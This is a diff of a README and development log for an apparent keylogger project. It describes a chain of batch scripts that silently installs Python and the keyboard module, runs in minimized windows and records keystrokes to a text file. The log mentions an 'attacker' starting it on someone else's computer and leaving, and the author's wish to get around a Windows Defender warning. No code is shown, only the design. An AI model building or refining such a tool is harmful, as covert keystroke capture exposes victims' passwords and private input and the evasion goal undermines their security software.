@@ -1,6 +1,6 @@
 # Keylogger-Code
 HOW TO USE:
-In order to get this code to work, you must download the four main files titled keyboard-package-check.bat, K-logger_Code.py, K-logger-internal-code.bat and K-logger-start.bat. once you have these files downloaded in the same directory, you only have to start the K-logger-start.bat file in order to start the keylogger, once the keylogger has started it will run all cmd prompts in a minimized window, the first window will be for the package check file which checks to see if you have the keyboard module installed, if not then it will be installed, the second prompt is a timeout window which just gives the first prompt window time to do its job. The third and final prompt is the keylogger itself and it will document what keys where pressed for as long as the cmd prompt stays open within a .txt file named keystrokes.txt within the same directory.
+In order to get this code to work, you must download the 5 main files titled Python-installer.bat, keyboard-package-check.bat, K-logger_Code.py, K-logger-internal-code.bat and K-logger-start.bat. once you have these files downloaded in the same directory, you only have to start the K-logger-start.bat file in order to start the keylogger, once the keylogger has started it will run all cmd prompts in a minimized window, the first window will check to see if python is installed and if not it will install python through the command line, the second window with be the package check file which checks to see if you have the keyboard module installed, if not then it will be installed, The third and final prompt is the keylogger itself and it will document what keys where pressed for as long as the cmd prompt stays open, it will document the keys pressed within a .txt file named keystrokes.txt which will be in the same directory as the other files.
 
 
 
@@ -17,3 +17,6 @@ I have just remembered that in order for this to work, the device would need to 
 
 24/04/2024 17:30 PM
 I have created a batch script that checks to see whether the keyboard module is installed or not and if not then it installs it, this file will make sure that the key logger itself will work if the individual has python installed and has python added to the command line PATH.
+
+24/04/2024 23:15 PM 
+I have created a batch script to check if python is installed in the first place and if not then it will be installed quietly through the command line, the only problem is that windows defender warns you that the file has an unknown publisher, I guess if the attacker quickly ran the start script and allowed windows to run it then left the computer it would be fine but still id say I need to find a way to counteract that.
